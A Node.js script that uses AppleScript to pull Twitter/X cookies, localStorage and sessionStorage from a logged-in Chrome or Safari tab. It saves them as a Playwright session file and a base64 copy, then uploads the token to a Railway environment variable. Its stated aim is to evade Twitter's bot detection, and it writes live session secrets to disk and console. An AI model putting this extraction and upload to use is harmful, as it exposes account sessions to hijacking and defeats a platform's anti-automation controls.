const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

/**
 * 🚀 BYPASS SESSION EXTRACTOR - USE EXISTING BROWSER SESSION
 * 
 * Instead of launching a new browser (which Twitter detects), this script:
 * 1. Uses your existing Chrome/Safari browser session
 * 2. Extracts cookies via AppleScript/JavaScript injection
 * 3. Bypasses all Twitter detection mechanisms
 * 4. Works with any existing logged-in Twitter session
 */

class BypassSessionExtractor {
    constructor() {
        this.sessionData = null;
    }

    async checkExistingBrowsers() {
        console.log('🔍 BYPASS_EXTRACTOR: Checking for existing browser sessions...');
        
        return new Promise((resolve) => {
            // Check for Chrome processes
            exec('ps aux | grep -i chrome | grep -v grep | head -5', (error, stdout) => {
                const chromeRunning = stdout.trim().length > 0;
                console.log(`   Chrome running: ${chromeRunning ? '✅' : '❌'}`);
                
                // Check for Safari processes  
                exec('ps aux | grep -i safari | grep -v grep | head -5', (error, stdout) => {
                    const safariRunning = stdout.trim().length > 0;
                    console.log(`   Safari running: ${safariRunning ? '✅' : '❌'}`);
                    
                    resolve({ chromeRunning, safariRunning });
                });
            });
        });
    }

    async extractFromChrome() {
        console.log('🌐 BYPASS_EXTRACTOR: Extracting from Chrome browser...');
        
        try {
            // Create AppleScript to extract cookies from Chrome
            const appleScript = `
                tell application "Google Chrome"
                    if (count of windows) > 0 then
                        set currentTab to active tab of front window
                        set currentURL to URL of currentTab
                        
                        if currentURL contains "x.com" or currentURL contains "twitter.com" then
                            -- Execute JavaScript to get cookies and storage
                            set cookieScript to "
                                const data = {
                                    cookies: document.cookie,
                                    localStorage: JSON.stringify(localStorage),
                                    sessionStorage: JSON.stringify(sessionStorage),
                                    url: window.location.href,
                                    userAgent: navigator.userAgent,
                                    timestamp: new Date().toISOString()
                                };
                                JSON.stringify(data);
                            "
                            
                            set result to execute currentTab javascript cookieScript
                            return result
                        else
                            return "ERROR: No Twitter tab found"
                        end if
                    else
                        return "ERROR: No Chrome windows open"
                    end if
                end tell
            `;

            return new Promise((resolve, reject) => {
                const scriptPath = '/tmp/extract_twitter_session.scpt';
                fs.writeFileSync(scriptPath, appleScript);
                
                exec(`osascript "${scriptPath}"`, (error, stdout, stderr) => {
                    // Clean up script file
                    try { fs.unlinkSync(scriptPath); } catch (e) {}
                    
                    if (error) {
                        console.log('❌ BYPASS_EXTRACTOR: Chrome extraction failed:', error.message);
                        resolve(null);
                        return;
                    }

                    try {
                        const sessionData = JSON.parse(stdout.trim());
                        if (sessionData.cookies && sessionData.cookies.length > 0) {
                            console.log('✅ BYPASS_EXTRACTOR: Successfully extracted Chrome session');
                            resolve(sessionData);
                        } else {
                            console.log('❌ BYPASS_EXTRACTOR: No valid session data in Chrome');
                            resolve(null);
                        }
                    } catch (parseError) {
                        console.log('❌ BYPASS_EXTRACTOR: Failed to parse Chrome session data');
                        resolve(null);
                    }
                });
            });

        } catch (error) {
            console.error('❌ BYPASS_EXTRACTOR: Chrome extraction error:', error.message);
            return null;
        }
    }

    async extractFromSafari() {
        console.log('🦁 BYPASS_EXTRACTOR: Extracting from Safari browser...');
        
        try {
            const appleScript = `
                tell application "Safari"
                    if (count of windows) > 0 then
                        set currentTab to current tab of front window
                        set currentURL to URL of currentTab
                        
                        if currentURL contains "x.com" or currentURL contains "twitter.com" then
                            -- Execute JavaScript to get session data
                            set sessionScript to "
                                const data = {
                                    cookies: document.cookie,
                                    localStorage: JSON.stringify(localStorage),
                                    sessionStorage: JSON.stringify(sessionStorage),
                                    url: window.location.href,
                                    userAgent: navigator.userAgent,
                                    timestamp: new Date().toISOString()
                                };
                                JSON.stringify(data);
                            "
                            
                            set result to do JavaScript sessionScript in currentTab
                            return result
                        else
                            return "ERROR: No Twitter tab found"
                        end if
                    else
                        return "ERROR: No Safari windows open"
                    end if
                end tell
            `;

            return new Promise((resolve, reject) => {
                const scriptPath = '/tmp/extract_safari_session.scpt';
                fs.writeFileSync(scriptPath, appleScript);
                
                exec(`osascript "${scriptPath}"`, (error, stdout, stderr) => {
                    // Clean up script file
                    try { fs.unlinkSync(scriptPath); } catch (e) {}
                    
                    if (error) {
                        console.log('❌ BYPASS_EXTRACTOR: Safari extraction failed:', error.message);
                        resolve(null);
                        return;
                    }

                    try {
                        const sessionData = JSON.parse(stdout.trim());
                        if (sessionData.cookies && sessionData.cookies.length > 0) {
                            console.log('✅ BYPASS_EXTRACTOR: Successfully extracted Safari session');
                            resolve(sessionData);
                        } else {
                            console.log('❌ BYPASS_EXTRACTOR: No valid session data in Safari');
                            resolve(null);
                        }
                    } catch (parseError) {
                        console.log('❌ BYPASS_EXTRACTOR: Failed to parse Safari session data');
                        resolve(null);
                    }
                });
            });

        } catch (error) {
            console.error('❌ BYPASS_EXTRACTOR: Safari extraction error:', error.message);
            return null;
        }
    }

    parseCookieString(cookieString) {
        const cookies = [];
        if (!cookieString) return cookies;

        const cookiePairs = cookieString.split(';');
        for (const pair of cookiePairs) {
            const [name, value] = pair.trim().split('=');
            if (name && value) {
                cookies.push({
                    name: name.trim(),
                    value: value.trim(),
                    domain: '.x.com',
                    path: '/',
                    secure: true,
                    httpOnly: false,
                    sameSite: 'None'
                });
            }
        }
        return cookies;
    }

    convertToPlaywrightFormat(rawSessionData) {
        console.log('🔄 BYPASS_EXTRACTOR: Converting to Playwright format...');
        
        try {
            const cookies = this.parseCookieString(rawSessionData.cookies);
            
            let localStorage = {};
            let sessionStorage = {};
            
            try {
                localStorage = JSON.parse(rawSessionData.localStorage || '{}');
            } catch (e) {
                console.log('⚠️  BYPASS_EXTRACTOR: Could not parse localStorage');
            }
            
            try {
                sessionStorage = JSON.parse(rawSessionData.sessionStorage || '{}');
            } catch (e) {
                console.log('⚠️  BYPASS_EXTRACTOR: Could not parse sessionStorage');
            }

            const playwrightSession = {
                timestamp: rawSessionData.timestamp,
                cookies,
                localStorage,
                sessionStorage,
                browserInfo: {
                    userAgent: rawSessionData.userAgent,
                    url: rawSessionData.url
                }
            };

            console.log(`✅ BYPASS_EXTRACTOR: Converted ${cookies.length} cookies to Playwright format`);
            return playwrightSession;

        } catch (error) {
            console.error('❌ BYPASS_EXTRACTOR: Conversion failed:', error.message);
            return null;
        }
    }

    async saveSessionData(sessionData) {
        console.log('💾 BYPASS_EXTRACTOR: Saving session data...');
        
        try {
            // Ensure data directory exists
            const dataDir = path.join(__dirname, 'data');
            if (!fs.existsSync(dataDir)) {
                fs.mkdirSync(dataDir, { recursive: true });
            }

            // Save main session file
            const sessionPath = path.join(dataDir, 'twitter_session.json');
            fs.writeFileSync(sessionPath, JSON.stringify(sessionData, null, 2));

            // Create backup with timestamp
            const backupPath = path.join(dataDir, `twitter_session_bypass_${Date.now()}.json`);
            fs.writeFileSync(backupPath, JSON.stringify(sessionData, null, 2));

            // Create base64 encoded version for Railway
            const sessionB64 = Buffer.from(JSON.stringify(sessionData)).toString('base64');
            const b64Path = path.join(__dirname, 'session_b64_bypass.txt');
            fs.writeFileSync(b64Path, sessionB64);

            console.log('✅ BYPASS_EXTRACTOR: Session data saved successfully');
            console.log(`   📁 Main file: ${sessionPath}`);
            console.log(`   📁 Backup: ${backupPath}`);
            console.log(`   📁 Base64: ${b64Path}`);
            
            return { sessionPath, backupPath, b64Path, sessionB64 };

        } catch (error) {
            console.error('❌ BYPASS_EXTRACTOR: Failed to save session data:', error.message);
            return null;
        }
    }

    async run() {
        console.log('🚀 BYPASS SESSION EXTRACTOR - NO DETECTION MODE');
        console.log('===============================================');
        console.log('🎯 Using existing browser session to bypass Twitter detection');
        console.log('🔒 No new browser launch = No bot detection');
        console.log('');

        try {
            // Check for existing browsers
            const browsers = await this.checkExistingBrowsers();
            
            let rawSessionData = null;

            // Try Chrome first
            if (browsers.chromeRunning) {
                console.log('');
                console.log('🌐 Attempting Chrome extraction...');
                console.log('📋 INSTRUCTIONS: Make sure you have Twitter/X open in Chrome and are logged in');
                rawSessionData = await this.extractFromChrome();
            }

            // Try Safari if Chrome failed
            if (!rawSessionData && browsers.safariRunning) {
                console.log('');
                console.log('🦁 Attempting Safari extraction...');
                console.log('📋 INSTRUCTIONS: Make sure you have Twitter/X open in Safari and are logged in');
                rawSessionData = await this.extractFromSafari();
            }

            if (!rawSessionData) {
                throw new Error('No valid session found in any browser. Please:\n' +
                              '1. Open Chrome or Safari\n' +
                              '2. Navigate to x.com and log in\n' +
                              '3. Make sure you can see your timeline\n' +
                              '4. Run this script again');
            }

            // Convert to Playwright format
            const playwrightSession = this.convertToPlaywrightFormat(rawSessionData);
            if (!playwrightSession) {
                throw new Error('Failed to convert session data to Playwright format');
            }

            // Save session data
            const saveResult = await this.saveSessionData(playwrightSession);
            if (!saveResult) {
                throw new Error('Failed to save session data');
            }

            console.log('');
            console.log('🎉 BYPASS_EXTRACTOR: SUCCESS! Session extracted from existing browser');
            console.log('🔄 Ready to update Railway environment variable');
            
            return saveResult;

        } catch (error) {
            console.error('');
            console.error('❌ BYPASS_EXTRACTOR: FAILED -', error.message);
            console.error('');
            return null;
        }
    }
}

// Run the bypass session extractor
async function main() {
    const extractor = new BypassSessionExtractor();
    const result = await extractor.run();
    
    if (result) {
        console.log('');
        console.log('🚀 NEXT STEPS:');
        console.log('1. Session extracted from existing browser');
        console.log('2. Ready to update Railway with fresh session');
        console.log('3. No Twitter detection - used existing session!');
        
        // Automatically update Railway
        console.log('');
        console.log('🔄 AUTO-UPDATING RAILWAY...');
        
        const { exec } = require('child_process');
        exec(`railway variables --set "TWITTER_SESSION_B64=${result.sessionB64}"`, (error, stdout, stderr) => {
            if (error) {
                console.error('❌ Failed to update Railway:', error.message);
                console.log('💡 Manual update command:');
                console.log(`railway variables --set "TWITTER_SESSION_B64=${result.sessionB64}"`);
            } else {
                console.log('✅ Railway environment variable updated!');
                console.log('🚀 System will restart automatically with fresh session');
            }
            process.exit(error ? 1 : 0);
        });
        
    } else {
        console.log('');
        console.log('❌ Session extraction failed. Please ensure:');
        console.log('1. Chrome or Safari is open');
        console.log('2. You are logged into Twitter/X');
        console.log('3. You can see your timeline (not login page)');
        process.exit(1);
    }
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = { BypassSessionExtractor };
